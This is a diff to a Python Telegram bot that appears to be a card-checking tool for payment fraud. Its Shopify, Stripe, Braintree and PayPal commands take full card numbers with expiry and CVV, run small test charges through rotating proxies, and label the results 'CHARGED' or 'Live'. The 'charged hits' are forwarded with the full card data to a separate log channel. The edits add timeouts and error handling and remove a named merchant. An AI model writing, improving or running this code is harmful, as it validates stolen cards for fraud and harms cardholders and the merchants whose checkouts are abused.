@@ -1602,41 +1602,51 @@ async def single_chk_cc(event):
         return
 
     try:
-        result = await check_card_with_retry(card, sites, proxies, max_retries=3)
+        try:
+            result = await asyncio.wait_for(check_card_with_retry(card, sites, proxies, max_retries=1), timeout=20)
+        except asyncio.TimeoutError:
+            result = {'status': 'Dead', 'message': 'Gateway Timeout (20s limit)', 'card': card, 'price': '-'}
+        except Exception as ex:
+            result = {'status': 'Dead', 'message': f'Error: {ex}', 'card': card, 'price': '-'}
+
         update_daily_usage(user_id, 1)
 
         cc_num = card.split('|')[0]
-        brand, bin_type, level, bank, country, flag = await get_bin_info(cc_num[:6])
+        try:
+            brand, bin_type, level, bank, country, flag = await get_bin_info(cc_num[:6])
+        except Exception:
+            brand, bin_type, level, bank, country, flag = "-", "-", "-", "-", "-", "🏳️"
 
         status_str = result.get('status', 'Declined')
         is_charged = status_str in ('Charged', 'Approved', 'CVV Live', 'approved')
-        status_emoji = "CHARGED \u2705" if is_charged else "DECLINED \u274c"
+        status_emoji = "CHARGED ✅" if is_charged else "DECLINED ❌"
         response_msg = str(result.get('message', 'Declined'))[:150]
         price = result.get('price', 'Auto')
 
         res_msg = f"""<b>AUTO SHOPIFY CHECKOUT</b>
-\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501
-\U0001f4b3 <b>Card:</b> <code>{card}</code>
-\u26a1 <b>Status:</b> {status_emoji}
-\U0001f4ac <b>Response:</b> <code>{response_msg}</code>
-\U0001f4b0 <b>Amount:</b> <code>{price}</code>
+━━━━━━━━━━━━━━━━━━━━
+💳 <b>Card:</b> <code>{card}</code>
+⚡ <b>Status:</b> {status_emoji}
+💬 <b>Response:</b> <code>{response_msg}</code>
+💰 <b>Amount:</b> <code>{price}</code>
 
-\u2139\ufe0f <b>Brand:</b> {brand} - {bin_type} ({level})
-\U0001f3e6 <b>Bank:</b> {bank}
-\U0001f310 <b>Country:</b> {country} {flag}"""
+ℹ️ <b>Brand:</b> {brand} - {bin_type} ({level})
+🏦 <b>Bank:</b> {bank}
+🌐 <b>Country:</b> {country} {flag}"""
 
         await status_msg.edit(res_msg, parse_mode="html")
 
         # Forward charged hits to log channel
         if is_charged:
             try:
-                hit_log = f"""\U0001f4b3 <b>CHARGED HIT</b>\n<code>{card}</code>\nGateway: Shopify\nAmount: {price}\nResponse: {response_msg}\nUser: {user_id}"""
+                hit_log = f"""💳 <b>CHARGED HIT</b>\n<code>{card}</code>\nGateway: Shopify\nAmount: {price}\nResponse: {response_msg}\nUser: {user_id}"""
                 await bot.send_message("Fchker", hit_log, parse_mode="html")
             except:
                 pass
 
     except Exception as e:
         await status_msg.edit(f"Error: {e}")
+
 
 
 
@@ -1785,7 +1795,13 @@ async def process_stripe1_cmd(event):
     
     # We reconstruct the cc_str since the module expects a single string:
     cc_str = f"{cc}|{mm}|{yy}|{cvc}"
-    st, msg, code = await check_card_stripe_1(cc_str, proxy_url=proxy)
+    try:
+        st, msg, code = await asyncio.wait_for(check_card_stripe_1(cc_str, proxy_url=proxy), timeout=20)
+    except asyncio.TimeoutError:
+        st, msg, code = "error", "Gateway Timeout (20s limit)", "timeout"
+    except Exception as e:
+        st, msg, code = "error", f"Error: {e}", "error"
+
     time_taken = round(time.time() - start_time, 2)
     status_line = f"Status: {st.upper()} - {msg}\n" if st not in ("charged", "approved") else ""
     res = f"""<b>Stripe $1 Charge</b>
@@ -1816,7 +1832,14 @@ async def process_br1_cmd(event):
     proxies = load_proxies()
     proxy = random.choice(proxies) if proxies else None
     start_time = time.time()
-    st, msg, code = await check_card_braintree_1(cc, mm, yy, cvc, proxy=proxy)
+
+    try:
+        st, msg, code = await asyncio.wait_for(check_card_braintree_1(cc, mm, yy, cvc, proxy_url=proxy), timeout=20)
+    except asyncio.TimeoutError:
+        st, msg, code = "error", "Gateway Timeout (20s limit)", "timeout"
+    except Exception as e:
+        st, msg, code = "error", f"Error: {e}", "error"
+
     time_taken = round(time.time() - start_time, 2)
     status_line = f"Status: {st.upper()} - {msg}\n" if st not in ("charged", "approved") else ""
     res = f"""<b>Braintree $1 Charge</b>
@@ -1826,6 +1849,7 @@ CC: <code>{cc}|{mm}|{yy}|{cvc}</code>
 ━━━━━━━━━━━━━━━━━━━━
 Gateway: Braintree $1"""
     await status_msg.edit(res, parse_mode="html")
+
 
 # ==================== BRAINTREE AUTH (b3auth) ENGINE ====================
 @bot.on(events.NewMessage(pattern=r'^/b3auth(?:\s+(.+))?$'))
@@ -1977,7 +2001,7 @@ async def process_paypal_cmd(event):
 
     card_input = event.pattern_match.group(1)
     if not card_input:
-        await event.reply("⚠️ Format: `/pp cc|mm|yy|cvv`")
+        await event.reply("Format: `/pp cc|mm|yy|cvv`")
         return
 
     try:
@@ -1987,10 +2011,10 @@ async def process_paypal_cmd(event):
         yy = parts[2].strip()
         cvc = parts[3].strip()
     except IndexError:
-        await event.reply("⚠️ Format: `/pp cc|mm|yy|cvv`")
+        await event.reply("Format: `/pp cc|mm|yy|cvv`")
         return
 
-    status_msg = await event.reply("🔄 <b>Processing PayPal Commerce ($1.00)...</b>", parse_mode="html")
+    status_msg = await event.reply("<b>Processing PayPal Commerce ($1.00)...</b>", parse_mode="html")
 
     proxies = load_proxies()
     proxy = None
@@ -2000,24 +2024,31 @@ async def process_paypal_cmd(event):
         proxy_status = "Live"
 
     start_time = time.time()
-    is_live, msg, raw_resp, _, amt = await process_paypal_charge(cc, mm, yy, cvc, proxy_url=proxy)
+    try:
+        is_live, msg, raw_resp, _, amt = await asyncio.wait_for(process_paypal_charge(cc, mm, yy, cvc, proxy_url=proxy), timeout=20)
+    except asyncio.TimeoutError:
+        is_live, msg, amt = False, "Gateway Timeout (20s limit)", "$1.00"
+    except Exception as e:
+        is_live, msg, amt = False, f"Error: {e}", "$1.00"
+
     time_taken = round(time.time() - start_time, 2)
 
     if is_live:
-        status = f"✅ <b>Approved / Live</b> - {msg}"
+        status = f"<b>Approved / Live</b> - {msg}"
     else:
-        status = f"❌ <b>Declined</b> - {msg}"
+        status = f"<b>Declined</b> - {msg}"
 
     res = f"""<b>PayPal Commerce Charge</b>
 ━━━━━━━━━━━━━━━━━━━━
-💳 <b>CC:</b> <code>{cc}|{mm}|{yy}|{cvc}</code>
-💡 <b>Status:</b> {status}
-💰 <b>Amount:</b> {amt}
-⏱️ <b>Time:</b> {time_taken}s | <b>Proxy:</b> {proxy_status}
+<b>CC:</b> <code>{cc}|{mm}|{yy}|{cvc}</code>
+<b>Status:</b> {status}
+<b>Amount:</b> {amt}
+<b>Time:</b> {time_taken}s | <b>Proxy:</b> {proxy_status}
 ━━━━━━━━━━━━━━━━━━━━
-<i>Gateway: PayPal Commerce (MyLifeBloom)</i>"""
+<i>Gateway: PayPal Commerce</i>"""
 
     await status_msg.edit(res, parse_mode="html")
+
 
 
 # ==================== BRAINTREE VBV ENGINE ====================
